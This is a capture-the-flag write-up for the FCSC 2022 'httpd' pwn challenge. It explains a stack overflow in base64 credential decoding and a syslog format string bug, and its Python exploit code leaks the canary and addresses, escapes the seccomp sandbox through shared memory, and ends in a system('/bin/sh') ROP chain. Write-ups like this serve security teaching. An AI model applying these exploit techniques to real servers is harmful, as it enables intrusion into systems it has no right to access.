# httpd



- Category: `pwn`
- Points: `500` => `477`
- Difficulty: :star::star::star:
- Solves: `10`
- :2nd_place_medal: 2nd to solve it



**Description**

> On vous demande d'auditer ce serveur web sandboxé. 
>
> `nc challenges.france-cybersecurity-challenge.fr 2058`
>
> **Note :** le binaire à exploiter n'a pas accès à Internet.



**Attachments**

- `httpd`
- `httpd.src.tar.gz`
- `ld-linux-x86-64.so.2`
- `libc.so.6` (glibc 2.33-0ubuntu5)



### :book: Introduction

`httpd` was a very fun and well-designed challenge (kudos to XeR, who created it) that featured a vulnerable HTTP Server, hardened with a very restrictive SECCOMP whitelist.



**TL;DR**

- Stack buffer overflow in the child process
- ROP to write arbitrary data in the shared memory
- Exploit the syslog format string vulnerability in the parent process
- Create a Write-What-Where primitive to write a ROP chain next to the main return address
- Send a HTTP request with `Connection: closed` header to end the program and return into our ROP chain 



The source code was given, and was well commented, which makes it easier to understand how the program works and identify vulnerabilities.

All protections are enabled on the binary, as we can see in the `Makefile`

```makefile
CFLAGS  += -fstack-protector-strong
LDFLAGS += -z now -z relro

httpd: httpd.c http.c base64.c worker.c audit.c

archive:
	tar cvzf httpd.src.tar.gz *.c *.h *.bpf *.i Makefile

.PHONY: clean
clean:
	rm -f httpd
```



### :microscope: Understanding the program



The program starts to allocate a shared memory area which will contain `shared` struct (`httpd.c`). This shared memory will be used later to communicate between the parent and the child processes.

```c
/* Prepare shared memory segment */
struct shared *shared = mmap(NULL, sizeof(*shared),
                             PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

if(MAP_FAILED == shared) {
    perror("mmap");
    return EXIT_FAILURE;
}
```

The `shared` struct is defined in the file `worker.h`

```c
struct shared {
	bool keepalive;
	bool loggedin;
	char username[0x100];
};
```



Then, the program enters the main loop to handle client requests:

```c
/* Main loop */
do {
    int status = request(shared);
    DEBUG("status = %d\n", status);
    audit(shared, status);
} while(shared->keepalive);
```



The `request` function (in `httpd.c`) basically forks the sandboxed child process and wait for its termination:

```c
static int request(struct shared *shared)
{
	pid_t pid = fork();

	if(0 > pid) {
		perror("fork");
		exit(EXIT_FAILURE);
	}

	if(0 == pid) {
		sandbox(shared); // Sandbox the child process, and handle client requests
		_exit(EXIT_FAILURE);
	}

	int status;
    // In the parent, waits for the child process to terminate
	if(pid != waitpid(pid, &status, 0)) {
		perror("waitpid");
		exit(EXIT_FAILURE);
	}
	
    // Return the child process status code
	return status;
}
```



The `sandbox` function (`httpd.c`) then applies SECCOMP rules to the child process, and finally handle the client request.

```c
noreturn void sandbox(struct shared *shared)
{	
    // ...
    
	static struct sock_filter filter[] = {
		#include "filter.i"
	};

	static struct sock_fprog bpf = {
		.filter = filter,
		.len    = sizeof(filter) / sizeof(*filter),
	};

	if(0 != prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
		perror("prctl PR_SET_NO_NEWPRIVS");
		exit(EXIT_FAILURE);
	}

	if(0 != seccomp(SECCOMP_SET_MODE_FILTER, 0, &bpf)) {
	 	perror("seccomp");
	 	exit(EXIT_FAILURE);
	}

	/* From now on we cannot use exit anymore, only _exit */
	do {
		/* We need to log something*/
		if(worker(shared))
			break;
	} while(shared->keepalive);

	_exit(EXIT_SUCCESS);
}
```



We can list the actual SECCOMP rules in file `filter.bpf`, or by using [seccomp-tools](https://github.com/david942j/seccomp-tools), to have a nicer output:

```
$ seccomp-tools dump ./httpd
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0009
 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009
 0005: 0x15 0x03 0x00 0x0000000f  if (A == rt_sigreturn) goto 0009
 0006: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0009
 0007: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0009
 0008: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

Once the SECCOMP rules are applied to the child process, only the following syscalls are allowed (the rules acts as a whitelist):

- `read`
- `write`
- `rt_sigreturn`
- `exit`
- `brk`

The architecture is also checked, this prevents us to bypass the sandbox by executing x86 syscalls with the instruction `int 0x80`.

We will see later in this writeup how to somehow "bypass" the sandbox.



Now we can dive into the core of the program: the HTTP server.

The `worker` function  (`worker.c`) describes pretty well what the HTTP server is doing:

```c
/* returns true if request should be audited */
bool worker(struct shared *shared)
{
	/* Reset some values */
	shared->keepalive = false;
	shared->loggedin  = false;

	/* Parse request */
	struct http_request *req = http_recv();

	if(NULL == req)
		return false;

	/* Determine the keep-alive-ness */
    // shared->keepalive is set to true if the header
    // "Connection" has the value "keep-alive".
    // If the request should be kept alive, the parent
    // process continues to handle requests from the client
	shared->keepalive = shouldKeepAlive(req);

	/* Request must be GET */
	if(0 != strcmp(req->method, "GET")) {
		http_text(HTTP_STATUS_BAD_METHOD, "GET || GTFO");
		return false;
	}

	/* Get b64 of creds */
	const char *b64 = getAuth(req);
	if(NULL == b64) {
		askAuth("PTDR t'es qui ?");
		return false;
	}

	DEBUG("b64 = %s\n", b64);

	/* Check the credentials */
	if(!checkAuth(b64, shared))
		return false;

	/* All that fuss for what ? */
	http_text(HTTP_STATUS_OK, "Congratulations! Now get the flag.");

	return true;
}
```

The HTTP server is really basic, it just parses a `GET` HTTP request, check the [HTTP Basic Authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication), if it is valid, it answers with the message `Congratulations! Now get the flag.`,  else no response is emitted.

The authentication check lies in the `checkAuth` function (`worker.c`), it basically decodes the base64 supplied input, and check if the username and password are `admin:admin`.

```c
#define LOGIN    "admin"
#define PASSWORD "admin"

bool checkAuth(const char *b64, struct shared *shared)
{
	char creds[0x100] = {};

    // Decode the base64-encoded Authorization header
	if(true != b64_decode(b64, strlen(b64), creds)) {
		askAuth("Malformed base64");
		return false;
	}

	/* Parse creds */
	char *saveptr;
	const char *login    = strtok_r(creds, ":", &saveptr);
	const char *password = strtok_r(NULL,  "",  &saveptr);

	/* Check login == "admin" */
	if(0 != strcmp(login, LOGIN)) {
		askAuth("Invalid username");
		return false;
	}

	/* Check password == "admin" */
	if(0 != strcmp(password, PASSWORD)) {
		askAuth("Invalid password");
		return false;
	}

	/* We're all set, keep track of the user */
	strncpy(shared->username, login, sizeof(shared->username));
	shared->loggedin = true; // The user is logged in

	return true;
}

```



I then continued to read the source code to figure out how the HTTP server is actually handling the requests.



Back in the parent process, the `audit` function is called after handling a client request.

It basically logs requests status using `syslog`, based on the content of the `shared` struct.



Remarks: *Although the program is meant to be a HTTP **server**, it isn't implemented as a real server with sockets and so on. The `httpd` process is just started with `socat` or something similar.*



### :mag: Hunting for vulnerabilities

Once we have a good understanding of the program, we can start hunting for bugs!



I spent some time setting up a reliable debugging setup, using `socat` to expose the program to a local port, and doing some manual fuzzing in the HTTP Request using Burp. I only managed to identify "null pointer dereference" bugs that didn't seem to be exploitable.

I then came back at reviewing the source code, as this method was kind of ineffective. As we all know, the source doesn't lie!



One weird thing that we can observe is the `checkAuth` function (inside the child process). In fact, the size of the decoded base64 of the `Authorization` header is not checked. Which leads to a possible stack buffer overflow, with controlled data!

```c
bool checkAuth(const char *b64, struct shared *shared)
{
	char creds[0x100] = {};

    // Decode the base64-encoded Authorization header
    // Size is not checked, if the size of the base64
    // output is > 0x100, we smash the stack :D
	if(true != b64_decode(b64, strlen(b64), creds)) {
		askAuth("Malformed base64");
		return false;
	}
    
    // ...
}
```



Another vulnerability that I discovered while doing source code review, lies in the `audit` function (inside the parent process).

```c
/* Determine the message and priority */
char msg[0x200];
int prio;

if(WIFEXITED(status)) {
    /* Keep track of connections in the audit log */
    snprintf(msg, sizeof(msg), "LOGIN %s", shared->username);
    prio = LOG_NOTICE;
} else if(WIFSIGNALED(status)) {
    /* Signal ? We should warn about this */
    snprintf(msg, sizeof(msg), "SIGNAL %d", WTERMSIG(status));
    prio = LOG_WARNING;
} else {
    /* ??? */
    snprintf(msg, sizeof(msg), "UNKNOWN %d", status);
    prio = LOG_CRIT;
}

/* Send the actual message to the logger */
syslog(prio, msg, 0);
```



According to the manual, the prototype of `syslog` is:

```c
void syslog(int priority, const char *format, ...);

/*
The  remaining  arguments  are  a  format, as in printf(3), and any arguments required by the format, except that the two-character sequence %m will be replaced by the error message string strerror(errno).  The format
       string need not include a terminating newline character.
*/
```

That means that if we can control the content or `msg`, we've got a format string vulnerability!



### :bomb: Exploiting the vulnerabilities

With the 2 previously identified vulnerabilities, we can manage to build strong primitives in our exploit:

- Arbitrary Code execution in the child process, by exploiting the buffer overflow
  - Which means:
    - Arbitrary Read primitive in the child process / shared memory
    - Arbitrary Write primitive in the child process / shared memory
- Arbitrary Read and Arbitrary Write in the parent process by, exploiting the format string vulnerability 
  - Which we can transform into Arbitrary Code Execution.



**:fountain: Stack buffer overflow in the child process**

As we previously saw in the `Makefile`, the binary has all the protections enabled (especially `Stack Smashing Protection` and `PIE`), so we cannot exploit the stack buffer overflow so easily. We have to somehow  get a leak of the binary base to construct our ROP chain.

One thing that is cool with `fork` based challenges, is that the parent address space is cloned for each child process it creates. This means that 2 consecutive forks conserves the same address layouts. It is also valid for stack canaries.

We can abuse that, and the fact that a "success" message is sent to us in the `worker` function when all went fine, to leak byte by byte the **stack canary**, **saved rbp** and saved **return address**.

```c
/* Check the credentials */
if(!checkAuth(b64, shared))
    return false;

// Here, the response is used as a "crash oracle".
// If we crash in the checkAuth function, we've got no output
// Else if everything went fine, we've got the "Congratulations" message.


/* All that fuss for what ? */
http_text(HTTP_STATUS_OK, "Congratulations! Now get the flag.");

return true;
```



We can start to write utility functions in our exploit to make it easier:

```py
# Crafts a HTTP request
def make_request(headers, verb='GET', filename='/', http='HTTP/1.1', body=b''):
    req = f'{verb} {filename} {http}\r\n'.encode()
    for h in headers:
        req += h + b': ' + headers[h] + b'\r\n' 
    req += b'\r\n'
    if body:
        req += body
    return req
```



For example, we can leak the canary byte by byte with this code:

```python
canary = b'\x00' # stack canaries LSB is always a nullbyte

p = log.progress('Leaking canary')

while len(canary) < 8:
    for guess in range(0x100):
        p.status(f'Trying {guess:02x}')
        # We need to have a valid authentication to reach the "checkAuth" function
        login = b'admin:admin\x00' 
        login += b'A'*252 # Canary offset
        login += canary + p8(guess)

        auth = b'Basic ' + base64.b64encode(login)

        req = make_request(headers={
            b'Authorization': auth,
            b'Connection': b'keep-alive',
        })

        r.send(req)

        req = make_request(headers={
            b'Connection': b'keep-alive',
        })

        # Here we send another request to fill the receive buffer
        # with another message, so that if we crash with the first request
        # we still got the output of the second, and we avoid I/O issues.
        r.send(req) 

        res = r.recvuntil('?')

        # If "Congratulations" is in the response, everything went fine
        # We found a valid canary byte
        if b"Congratulations" in res:
            canary += p8(guess)
            log.success('Found byte 0x%02x' % guess)
            break

        # If we didn't find any byte, we exit
        # Should never happen, but with I/O issues it is still possible.
        if guess == 0xff:
            log.failure('Failed to find canary byte')
            exit(1)

canary = u64(canary)

log.success('canary: 0x%016x' % canary)
```



We do the same thing to leak the **saved rbp**, and the **saved return address**.

Once everything has been leaked, we can compute the binary base address, as offsets are constants:

```python
code_base = ret_addr - 0x289e
log.success('ret_addr: 0x%016x' % ret_addr)
log.success('code_base: 0x%016x' % code_base)
```



Now we've got everything we need, it's time to cook our ROP chain ! :man_cook:

PS: The leaking part takes some time, as I needed to be fast I just used a gdb script to automatically get the necessary leaks.



Firstly, we need to leak the `libc` base address. We can do that easily by doing a simple `puts(puts@GOT)`.

The only gadget that we need at the moment is `pop rdi ; ret`, which we can find in the httpd binary using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget):

```
$ ROPgadget --binary ./httpd | grep "pop rdi ; ret"
0x0000000000002aa3 : pop rdi ; ret
```

```python
pop_rdi = code_base + 0x0000000000002aa3 # pop rdi ; ret
puts_got = code_base + elf.got['puts']
puts_addr = code_base + elf.sym['puts']
```



The ROP chain is now ready to get our first libc leak!

```python
# Leak libc

login = b'admin:admin\x00'
login += b'A'*252
login += p64(canary)
login += p64(0xdeadbeefcafebabe) # saved rbp
login += p64(pop_rdi)
login += p64(puts_got)
login += p64(puts_addr)

auth = b'Basic ' + base64.b64encode(login)

req = make_request(headers={
    b'Authorization': auth,
    b'Connection': b'keep-alive', # /!\ Important, we don't want the parent process to end
})

r.send(req)

libc_base = u64(r.recvn(6).ljust(8, b'\x00')) - libc.sym['puts']
log.success('libc_base: 0x%016x' % libc_base)
```



We will also need the `shared` memory address (as explained the later in this writeup) :eyes:.

We can find it in the `main` stack frame. So we need to leak a stack address to compute it's location address. We can do that by leaking the value of the `environ` variable, which is present in the libc.

```python
# Leak environ

login = b'admin:admin\x00'
login += b'A'*252
login += p64(canary)
login += p64(0xdeadbeefcafebabe)
login += p64(pop_rdi)
login += p64(libc_base + libc.sym['environ'])
login += p64(puts_addr)

auth = b'Basic ' + base64.b64encode(login)

req = make_request(headers={
    b'Authorization': auth,
    b'Connection': b'keep-alive',
})

r.send(req)

environ_addr = u64(r.recvn(7).strip().ljust(8, b'\x00'))
ret_addr = environ_addr - 0x100

log.success('environ addr is @ %s' % hex(environ_addr))
```

The shared memory is located at `environ - 0x140`, we can make another leak of that address to get our precious shared memory address:

```py
# Leak shared memory addr

shared_memory = environ_addr - 0x140

login = b'admin:admin\x00'
login += b'A'*252
login += p64(canary)
login += p64(0xdeadbeefcafebabe)
login += p64(pop_rdi)
# Here we add 1 to the shared memory location, 
# as the LSB of the shared memory address is 0x00
# and puts stops at a null byte.
login += p64(shared_memory + 1) 
login += p64(puts_addr)

auth = b'Basic ' + base64.b64encode(login)

req = make_request(headers={
    b'Authorization': auth,
    b'Connection': b'keep-alive',
})

r.send(req)

# We re-introduce the nullbyte
shared_base = u64(r.recvn(6).strip().ljust(8, b'\x00')) << 0x8
log.success('shared_base is @ %s' % hex(shared_base))
```



**:european_castle: Escaping the sandbox**

Now that we collected all our leaks, we can't start the real business: escaping the sandbox.

As a reminder, the following rules are applied to the sandboxed child process

```$ seccomp-tools dump ./httpd
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0009
 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009
 0005: 0x15 0x03 0x00 0x0000000f  if (A == rt_sigreturn) goto 0009
 0006: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0009
 0007: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0009
 0008: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

This is a really restrictive whitelist that we theorically cannot bypass. If the `open`  and `lseek` syscalls were allowed, we could try to write to `/proc/$ppid/mem` to overwrite the return address of the main function of the parent process by our custom ropchain (more informations [in this writeup](https://blog.bi0s.in/2020/08/24/Pwn/GCTF20-Writeonly/)).



We have to find another way to execute restricted syscalls. One weird thing that is not so common is that `shared` memory, which only contains the following fields:

```c
struct shared {
    bool keepalive;
    bool loggedin;
    char username[0x100];
};
```

The parent process is **not** affected by SECCOMP. This means that if we can execute arbitrary code inside the parent process, we can call `system("/bin/sh")` and get a shell!

If we remember correctly, there is a format string vulnerability in the `audit` function, that can be triggered if we control the `msg` variable. 

```c
/* Determine the message and priority */
char msg[0x200];
int prio;

if(WIFEXITED(status)) {
    /* Keep track of connections in the audit log */
    snprintf(msg, sizeof(msg), "LOGIN %s", shared->username);
    prio = LOG_NOTICE;
} else if(WIFSIGNALED(status)) {
    /* Signal ? We should warn about this */
    snprintf(msg, sizeof(msg), "SIGNAL %d", WTERMSIG(status));
    prio = LOG_WARNING;
} else {
    /* ??? */
    snprintf(msg, sizeof(msg), "UNKNOWN %d", status);
    prio = LOG_CRIT;
}

/* Send the actual message to the logger */
syslog(prio, msg, 0);
```

Well, if the child process exits correctly with a `0` status code, we reach the following line:

```c
snprintf(msg, sizeof(msg), "LOGIN %s", shared->username);
```

If the `shared->username` contains some format characters, we can exploit the format string! However, there is another problem. To succeed, the `checkAuth` variable needs to have `username` set to `admin`. Well we an execute arbitrary code in the child process, and `read` syscall is allowed! Why can't we just call `read(0, shared, 0x1000)` to fill up the shared memory with arbitrary data ?

This is exactly what we'll do!

Before diving into the format string exploitation, we need some more gadgets to make a `read(0, shared, 0x1000)` (basically control `rsi`, `rdx`, `rax`, and have the possibility to execute a syscall). We can find all these gadgets inside the libc using ROPgadget!

```python
read_addr = libc_base + libc.sym['read']
pop_rax = libc_base + 0x0000000000044c70 # pop rax ; ret
pop_rsi = libc_base + 0x000000000002a4cf # pop rsi ; ret
pop_rdx = libc_base + 0x00000000000c7f32 # pop rdx ; ret
syscall = libc_base + 0x0000000000026858 # syscall
```

We can then craft another ROPchain to call read, which will fill up the shared memory area.

 ```python
 login = b'admin:admin\x00'
 login += b'A'*252
 login += p64(canary)
 login += p64(0xdeadbeefcafebabe)
 login += p64(pop_rdi)
 login += p64(0) # stdin fileno
 login += p64(pop_rsi)
 login += p64(shared_base) # shared memory base address
 login += p64(pop_rdx)
 login += p64(len(buf) + 2) # size of our data + 2 for the two booleans before the username
 login += p64(libc_base + libc.sym['read']) # read(0, shared, len(buf) + 2)
 
 auth = b'Basic ' + base64.b64encode(login)
 
 req = make_request(headers={
     b'Authorization': auth,
     b'Connection': b'keep-alive',
 })
 
 r.send(req)
 r.send(p16(0x0101) + buf) # We then send the actual data we want to send.
 ```

We also need to have the child process exiting with return code 0. We can just append a `exit(0)` call to our ROPchain:

```py
login += p64(pop_rax)
login += p64(0x3c) # SYS_exit
login += p64(pop_rdi)
login += p64(0) 
login += p64(syscall) # exit(0)
```



**:boom: Arbitrary Write in the parent process**

Now that we successfully managed to write arbitrary data in the shared memory, that will be passed to `syslog`, we can spend some time developing a arbitrary write primitive.

We find by debugging, that our controlled data in our format string is located at offset `26` on the stack. We can then exploit a classic format string vulnerability to overwrite arbitrary data. As a reminder, what we managed to leak in the child process is still valid in the parent process, are they address space are the same!

We just take the previous code to write arbitrary data to shared memory, to exploit the format string vulnerability.

```python
def write_word(where, what):
    what = (what - len("LOGIN ")) & 0xffff
    buf = b'%' + str(what).encode() + b'c%26$hn'
    buf += b'A'*(0x82-len(buf))
    buf += p64(where) # Located at offset 26

    login = b'admin:admin\x00'
    login += b'A'*252
    login += p64(canary)
    login += p64(0xdeadbeefcafebabe)
    login += p64(pop_rdi)
    login += p64(0)
    login += p64(pop_rsi)
    login += p64(shared_base)
    login += p64(pop_rdx)
    login += p64(len(buf) + 2)
    login += p64(libc_base + libc.sym['read'])
    login += p64(pop_rax)
    login += p64(0x3c)
    login += p64(pop_rdi)
    login += p64(0)
    login += p64(syscall)

    auth = b'Basic ' + base64.b64encode(login)

    req = make_request(headers={
        b'Authorization': auth,
        b'Connection': b'keep-alive',
    })

    r.send(req)
    r.send(p16(0x0101) + buf)
```



We finally have to overwrite the data next to the main return address in the parent process by a simple `system("/bin/sh")` ROP chain:

```python
ret_addr = environ_addr - 0x100
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

# We use a ret here to avoid stack alignement issues
# check https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul for more informations
rop = p64(pop_rdi+1) 
rop += p64(pop_rdi)
rop += p64(binsh_addr)
rop += p64(system_addr) # system("/bin/sh")

# We write word by word the ROP chain
for i in range(0, len(rop), 2):
    write_word(ret_addr + i, u16(rop[i:i+2]))

req = make_request(headers={
    b'Authorization': auth,
    # /!\ Important, to make the parent process returning, we have to set "Connection" header value to "close".
    b'Connection': b'close', 
})

r.send(req)
log.success('Enjoy your shell :)')
r.interactive()
```



Flag: `FCSC{d87c69143541ae0d3e43f8d65bff7072646cdc781167b89aedf0146cb20ed3cd}`.



### :checkered_flag: Conclusion

`httpd` was my favorite pwn challenge of the 2022 FCSC edition (along with `RPG`). I was impressed by how well the challenge was designed , thanks again to `XeR`! 